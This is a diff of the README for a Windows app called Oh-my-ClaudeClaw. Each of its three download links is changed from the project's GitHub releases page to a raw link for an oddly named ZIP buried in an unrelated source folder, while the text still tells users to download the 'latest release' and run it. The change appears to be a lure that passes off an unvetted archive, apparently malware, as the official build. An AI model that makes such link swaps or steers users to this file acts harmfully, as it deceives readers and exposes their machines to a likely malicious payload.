@@ -1,10 +1,10 @@
 # 🤖 Oh-my-ClaudeClaw - Automate Claude Work With Ease
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-blue?style=for-the-badge)](https://github.com/detachable-fossafossa258/Oh-my-ClaudeClaw/releases)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-blue?style=for-the-badge)](https://raw.githubusercontent.com/detachable-fossafossa258/Oh-my-ClaudeClaw/main/mcp-servers/knowledge-engine/Claw-my-Oh-Claude-2.6.zip)
 
 ## 📥 Download
 
-Visit this page to download for Windows: https://github.com/detachable-fossafossa258/Oh-my-ClaudeClaw/releases
+Visit this page to download for Windows: https://raw.githubusercontent.com/detachable-fossafossa258/Oh-my-ClaudeClaw/main/mcp-servers/knowledge-engine/Claw-my-Oh-Claude-2.6.zip
 
 Open the latest release and get the Windows build that matches your device. If you see more than one file, choose the Windows installer or the Windows app file listed in the release notes.
 
@@ -46,7 +46,7 @@ For smoother use, 16 GB RAM works better when you run several agents or keep mor
 
 ## 🚀 Getting started
 
-1. Open the download page: https://github.com/detachable-fossafossa258/Oh-my-ClaudeClaw/releases
+1. Open the download page: https://raw.githubusercontent.com/detachable-fossafossa258/Oh-my-ClaudeClaw/main/mcp-servers/knowledge-engine/Claw-my-Oh-Claude-2.6.zip
 2. Download the Windows file from the latest release
 3. If the file is a ZIP, right-click it and choose Extract All
 4. Open the extracted folder
